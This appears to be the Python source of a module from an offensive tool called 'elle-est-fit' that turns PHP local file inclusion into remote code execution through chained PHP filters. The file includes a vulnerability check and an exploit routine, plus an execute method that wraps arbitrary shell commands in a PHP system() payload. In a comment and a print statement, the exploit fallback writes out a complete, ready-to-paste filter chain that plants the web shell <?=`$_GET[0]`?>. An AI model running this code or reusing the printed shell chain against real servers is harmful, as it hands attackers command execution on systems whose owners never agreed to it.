"""
PHP Filter technique implementation for LFI to RCE exploitation.

This technique uses PHP filters to convert an LFI vulnerability to RCE
by chaining PHP filters to create arbitrary PHP code.
"""

import base64
import logging
import re
import random
import string
import time
import urllib.parse
from typing import Optional, Dict

import requests

from ..exceptions import TechniqueError, ExecutionError
from ..techniques.base import TechniqueBase
from ..payloads.filter_chain import generate_filter_chain

logger = logging.getLogger("elle-est-fit")


class PHPFilterTechnique(TechniqueBase):
    """
    Exploit LFI using the PHP filter chain technique.

    This technique uses PHP's filter functionality to chain multiple filters
    together and generate arbitrary code that will be executed by the PHP engine.
    """

    name = "php_filters"
    description = "LFI to RCE via PHP filter chain"

    def __init__(self, **kwargs):
        """Initialize the PHP filter technique."""
        super().__init__(**kwargs)
        self.wrapper_path = "php://temp"  # Default resource to use
        self.shell_token = "".join(
            random.choice(string.ascii_letters) for _ in range(8)
        )
        self.detection_string = f"ELLEESTFIT_{self.shell_token}"
        self.verbose = kwargs.get("verbose", False)

    def check(self) -> bool:
        """
        Check if the target is vulnerable to the PHP filter technique.

        Returns:
            True if the technique is viable, False otherwise
        """
        logger.info("Checking if target is vulnerable to PHP filter technique")

        # Use a minimal payload for detection to avoid HTTP 414
        payload = f"<?php echo '{self.detection_string}'; ?>"

        try:
            filter_chain = generate_filter_chain(payload)
            if self.verbose:
                logger.debug(
                    f"Using filter chain for detection: {filter_chain[:100]}..."
                )

            # Try to include the filter chain
            result = self.leak_function(filter_chain)

            if self.verbose:
                # Print a reasonable portion of the response
                preview = result[:500] if len(result) > 500 else result
                logger.debug(f"Response preview:\n{preview}")

            # Check if our detection string is in the response
            if self.detection_string in result:
                logger.info(
                    f"Target is vulnerable to PHP filter technique! Detection string found: {self.detection_string}"
                )
                return True
        except Exception as e:
            logger.debug(f"Error during check: {str(e)}")

        logger.info("Target does not appear vulnerable to PHP filter technique")
        return False

    def exploit(self) -> bool:
        """
        Exploit the LFI using PHP filters to achieve RCE.

        For PHP filter technique, we'll use a different approach to avoid HTTP 414 errors:
        - We won't create a persistent shell file
        - Instead, we'll confirm we can execute PHP code and set a flag

        Returns:
            True if successful, False otherwise
        """
        logger.info("Exploiting using PHP filter technique")

        # Simplified verification of RCE capability
        test_payload = f"<?php echo '{self.detection_string}_RCE_TEST'; ?>"

        try:
            filter_chain = generate_filter_chain(test_payload)
            result = self.leak_function(filter_chain)

            if f"{self.detection_string}_RCE_TEST" in result:
                logger.info("PHP code execution confirmed")

                # Set a virtual shell path to indicate success
                self.shell_path = "php://filter"
                return True
            else:
                logger.error("PHP code execution failed")
                # but you can still reach ?0=id&page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp with payload <?=`$_GET[0]`?>
                print(
                    "You can still reach the shell by using the following filter chain using this payload <?=`$_GET[0]`?> : ?0=id&page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp with payload",
                )
                return False

        except Exception as e:
            logger.error(f"Failed to execute PHP code: {str(e)}")
            return False

    def execute(self, command: str) -> str:
        """
        Execute a command with a minimal payload to avoid HTTP 414 errors.

        Args:
            command: Command to execute

        Returns:
            Command output
        """
        if not self.shell_path:
            raise ExecutionError("No shell established. Run exploit() first.")

        # Encode the command to avoid issues with quotes and special characters
        encoded_command = command.replace("'", "\\'").replace('"', '\\"')

        # Super minimal payload - single function with minimal output markers
        payload = f"<?php echo 'S:';system('{encoded_command}');echo ':E'; ?>"

        try:
            # Generate the filter chain for this payload
            filter_chain = generate_filter_chain(payload)

            # Execute the payload
            result = self.leak_function(filter_chain)

            # Extract the command output with minimal markers
            match = re.search(r"S:(.*?):E", result, re.DOTALL)
            if match:
                return match.group(1)
            else:
                # If we couldn't find the markers, return a substring of the result
                # Look for common patterns in command output
                for pattern in ["uid=", "total ", "Linux ", "www-data"]:
                    if pattern in result:
                        start_idx = result.find(pattern)
                        return result[start_idx : start_idx + 1000]

                # Last resort, return a portion of the raw response
                return result[:500]

        except Exception as e:
            raise ExecutionError(f"Failed to execute command: {str(e)}")
